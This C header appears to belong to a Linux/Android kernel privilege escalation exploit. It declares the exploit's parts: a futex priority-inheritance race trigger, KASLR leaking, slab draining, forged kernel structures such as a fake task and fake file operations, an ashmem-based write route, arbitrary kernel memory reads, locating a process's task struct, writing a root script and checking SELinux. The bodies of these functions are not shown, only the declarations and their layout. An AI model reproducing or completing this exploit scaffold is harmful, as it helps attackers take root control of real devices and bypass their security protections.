#ifndef COMMON_H
#define COMMON_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/futex.h>
#include <linux/keyctl.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096UL
#endif
#define PAGE_SHIFT 12

/* ---- ashmem (W2 FOPS route) -------------------------------------------- */
#define ASHMEM_NAME_LEN   256
#define __ASHMEMIOC       0x77
#define ASHMEM_SET_NAME   _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#define ASHMEM_GET_NAME   _IOR(__ASHMEMIOC, 2, char[ASHMEM_NAME_LEN])

#define pr_error(...) do { fprintf(stderr, "[!] " __VA_ARGS__); fflush(stderr); } while (0)
#define pr_warning(...) do { fprintf(stderr, "[-] " __VA_ARGS__); fflush(stderr); } while (0)
#define pr_info(...) do { fprintf(stderr, "[*] " __VA_ARGS__); fflush(stderr); } while (0)
#define pr_success(...) do { fprintf(stderr, "[+] " __VA_ARGS__); fflush(stderr); } while (0)

#define SYSCHK(x) ({ \
  __typeof__(x) __ret = (x); \
  if ((long)__ret < 0) { \
    pr_error("%s:%d: %s failed errno=%d (%s)\n", __FILE__, __LINE__, #x, errno, strerror(errno)); \
    _exit(1); \
  } \
  __ret; })

/* ---- globals shared between main/util/route ---------------------------- */
extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;
extern int kaslr_done;

extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_parent;
extern uintptr_t fake_right;
extern uintptr_t fake_left;
extern uintptr_t fake_fops;

/* custom write state (W1/W2) */
extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;

/* trigger threads */
extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int main_route_delay_usec;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

/* ---- util.c ------------------------------------------------------------ */
long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
void pin_to_core(int core);
void disable_rseq_for_thread(void);
int env_flag(const char *name, int def);
int env_int_range(const char *name, int def, int min, int max);
uintptr_t env_hex(const char *name, uintptr_t def);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t data_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
void set_kernel_phys_load(uint64_t v);
int leak_kaslr(void);
uint64_t perf_find_task(void);
void slab_drain(void);
void write_root_script(void);
pid_t clone_child(void);
pid_t clone_leak_child(void *(*fn)(void *), void *arg);
int open_memfd(pid_t child);
void kill_child(pid_t child);
uintptr_t prepare_good_kernel_page(void);
int cleanup_page_prepare_state(void);
/* W2 FOPS route */
int install_fake_fops(uintptr_t target);
int install_fake_fops_v2(uintptr_t fops_field);
int open_ashmem_device(void);
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
uint64_t kernel_read64(int fd, uintptr_t target);
uintptr_t find_task_by_tgid(int fd, uint32_t want_tgid);

/* ---- route.c ----------------------------------------------------------- */
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);
int pselect_custom_write_enabled(void);
void do_pselect_fake_lock_route(void);
void run_main_route_threads(void);
void reset_main_route_state(void);

/* ---- main.c ------------------------------------------------------------ */
int check_selinux_off(void);

static inline int gettid_(void) { return (int)syscall(SYS_gettid); }

#endif
